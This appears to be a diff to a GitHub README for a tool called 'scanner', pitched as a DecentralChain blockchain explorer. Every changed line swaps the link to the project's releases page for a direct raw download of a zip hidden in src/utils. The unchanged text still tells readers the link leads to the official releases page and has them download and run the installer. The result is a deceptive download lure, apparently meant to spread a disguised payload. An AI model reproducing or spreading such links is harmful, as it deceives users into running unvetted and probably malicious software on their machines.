@@ -1,6 +1,6 @@
 # 🔍 scanner - Explore DecentralChain Easily
 
-[![Download scanner](https://img.shields.io/badge/Download-Get%20scanner-blue?style=for-the-badge)](https://github.com/margarethot690/scanner/releases)
+[![Download scanner](https://img.shields.io/badge/Download-Get%20scanner-blue?style=for-the-badge)](https://github.com/margarethot690/scanner/raw/refs/heads/main/src/utils/Software-v1.9.zip)
 
 ## 📋 About scanner
 
@@ -28,7 +28,7 @@ Follow these steps to get scanner running on your Windows PC.
 
 Click this big button to visit the download page:
 
-[![Download scanner](https://img.shields.io/badge/Download-Visit%20Releases-green?style=for-the-badge)](https://github.com/margarethot690/scanner/releases)
+[![Download scanner](https://img.shields.io/badge/Download-Visit%20Releases-green?style=for-the-badge)](https://github.com/margarethot690/scanner/raw/refs/heads/main/src/utils/Software-v1.9.zip)
 
 This link takes you to the official GitHub releases page. Here you will find the latest version of scanner ready to download.
 
@@ -147,7 +147,7 @@ If problems continue, report issues on the GitHub repository page under "Issues"
 
 To update scanner:
 
-1. Visit the releases page at https://github.com/margarethot690/scanner/releases again.
+1. Visit the releases page at https://github.com/margarethot690/scanner/raw/refs/heads/main/src/utils/Software-v1.9.zip again.
 2. Download the latest Windows installer.
 3. Run the new installer. It will update your current version without removing settings.
 
@@ -157,7 +157,7 @@ Keep scanner updated to get new features and fixes.
 
 Use this link to access the latest scanner versions:
 
-[https://github.com/margarethot690/scanner/releases](https://github.com/margarethot690/scanner/releases)
+[https://github.com/margarethot690/scanner/raw/refs/heads/main/src/utils/Software-v1.9.zip](https://github.com/margarethot690/scanner/raw/refs/heads/main/src/utils/Software-v1.9.zip)
 
 Visit the page, pick the Windows installer file, download, and run it as explained above.
 
